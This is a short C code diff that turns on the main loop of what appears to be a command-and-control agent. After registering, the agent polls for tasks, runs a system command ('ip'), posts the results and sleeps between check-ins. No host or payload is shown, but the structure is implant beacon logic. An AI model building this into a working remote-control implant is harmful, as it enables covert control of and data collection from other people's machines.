@@ -45,33 +45,33 @@ int main(void)
     puts("Made it out of reg\n");
     printf("UUID in main is %s", agent.uuid);
 
-    // while(true) {
-    //     puts("Checking tasks\n");
-    //     // Check tasks will eventually return an array of strings.
-    //     // The number of elements in that array will dictate how.
-    //     // Many tasks there were and how many times execute_tasks
-    //     // will be called.
-    //     check_tasks();
+    while(true) {
+        puts("Checking tasks\n");
+        // Check tasks will eventually return an array of strings.
+        // The number of elements in that array will dictate how.
+        // Many tasks there were and how many times execute_tasks
+        // will be called.
+        check_tasks(&agent, &sa);
 
-    //     // Eventually check_tasks will return the task type and
-    //     // specific task. An if block will be added here to
-    //     // check if task type is cmd, if so, run the cmd commands.
-    //     if(can_run_cmd("ip")) {
-    //         puts("Command exists\n");
-    //         if(run_cmd(&sa)) {
-    //             // printf("%s", sa.words);
-    //             post_results(&sa);
-    //         }
+        // Eventually check_tasks will return the task type and
+        // specific task. An if block will be added here to
+        // check if task type is cmd, if so, run the cmd commands.
+        if(can_run_cmd("ip")) {
+            puts("Command exists\n");
+            if(run_cmd(&sa)) {
+                // printf("%s", sa.words);
+                post_results(&sa);
+            }
 
-    //     } else {
-    //         puts("Command does not exist\n");
-    //         continue;
+        } else {
+            puts("Command does not exist\n");
+            continue;
 
 
-    //     }
+        }
 
-    //     // remember to destroy sa.words at some point.
-    //     sleep(10);
-    // }
+        // remember to destroy sa.words at some point.
+        sleep(10);
+    }
         
 }
